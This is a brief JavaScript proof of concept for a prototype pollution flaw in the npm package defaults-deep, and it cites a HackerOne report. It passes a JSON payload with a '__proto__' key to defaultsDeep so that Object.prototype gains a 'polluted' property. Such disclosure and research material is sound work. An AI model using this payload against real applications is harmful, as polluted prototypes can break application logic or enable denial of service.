//https://hackerone.com/reports/310514
 
  const defaultsDeep = require("defaults-deep");
   

  let malicious_payload = '{"__proto__":{"polluted":"yes"}}';

  defaultsDeep({}, JSON.parse(malicious_payload));
// End of file
